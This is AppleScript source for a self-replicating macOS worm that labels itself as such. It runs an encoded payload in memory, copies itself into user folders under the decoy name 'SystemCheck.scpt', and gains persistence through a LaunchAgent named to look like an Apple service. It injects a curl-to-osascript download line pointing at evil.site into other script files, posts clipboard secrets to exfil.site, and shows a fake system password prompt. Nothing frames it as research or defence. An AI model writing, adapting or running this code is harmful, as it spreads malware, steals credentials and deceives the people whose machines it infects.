-- ░█░█░█▀█░█▀█░█░░░█░█░▀█▀░█▀█
-- ░█▀█░█▀█░█░█░█░░░█░█░░█░░█▀█
-- ░▀░▀░▀░▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀
-- ADVANCED SELF-REPLICATING APPLESCRIPT WORM

-- Base64-encoded payload to re-execute in RAM
set payloadB64 to "ZG8gc2hlbGwg...WJhc2g=" -- replace with actual base64 of payload

-- Decode + run payload in memory
do shell script "echo " & payloadB64 & " | base64 -D | osascript &"

-- ░█▀▄░█▀▀░█▀▀░█░█░█▀▀░█▀█
-- ░█▀▄░█▀▀░▀▀█░█░█░█▀▀░█░█
-- ░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀░▀

-- Copy worm into common folders for user to click
set mePath to POSIX path of (path to me)
set targets to {"/Users/Shared/", "~/Desktop/", "~/Documents/", "~/Downloads/"}

repeat with target in targets
	try
		do shell script "cp " & quoted form of mePath & " " & quoted form of (target & "SystemCheck.scpt")
	end try
end repeat

-- ░█░█░█▀▀░█░░░█░█░▀█▀░█▀▀
-- ░█░█░█▀▀░█░░░█░█░░█░░▀▀█
-- ░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀

-- Set up persistence via LaunchAgent
set plist to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" & ¬
"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n" & ¬
"<plist version=\"1.0\">\n<dict>\n" & ¬
"  <key>Label</key>\n  <string>com.apple.sync.agent</string>\n" & ¬
"  <key>ProgramArguments</key>\n  <array>\n    <string>/usr/bin/osascript</string>\n    <string>" & mePath & "</string>\n  </array>\n" & ¬
"  <key>RunAtLoad</key>\n  <true/>\n" & ¬
"</dict>\n</plist>"

-- Save LaunchAgent and load it
do shell script "echo " & quoted form of plist & " > ~/Library/LaunchAgents/com.apple.sync.agent.plist"
do shell script "launchctl load ~/Library/LaunchAgents/com.apple.sync.agent.plist"

-- ░█▀▀░█▀█░█▀▀░█░█░▀█▀░█▀▀
-- ░▀▀█░█▀█░█░░░█░█░░█░░▀▀█
-- ░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀▀

-- Inject this worm into other AppleScript files
set selfCode to "-- INJECTED WORM PAYLOAD\n" & ¬
"do shell script \"curl -s https://evil.site/payload.scpt | osascript\"\n"

-- Search user dir for .applescript files and append worm code
do shell script "find ~ -name '*.applescript' -exec sh -c 'echo \"" & selfCode & "\" >> \"$1\"' _ {} \\;"

-- ░█░█░█░░░▀█▀░█▀█░▀█▀░█░█
-- ░█░█░█░░░░█░░█░█░░█░░█▀█
-- ░▀▀▀░▀▀▀░▀▀▀░▀░▀░░▀░░▀░▀

-- Optional: Steal clipboard data if it contains sensitive patterns
try
	set clip to the clipboard
	if clip contains "password" or clip contains "secret" then
		do shell script "curl -X POST -d " & quoted form of clip & " https://exfil.site/api"
	end if
end try

-- ░█▀▀░█▀█░█░░░█▀▀░█░█░█▀█░█▀▀
-- ░█░░░█░█░█░░░█▀▀░█░█░█░█░▀▀█
-- ░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀░▀░▀▀▀

-- Use GUI automation to fake legitimate prompts
try
	display dialog "macOS requires your password to continue." default answer "" with hidden answer
end try

-- END OF WORM
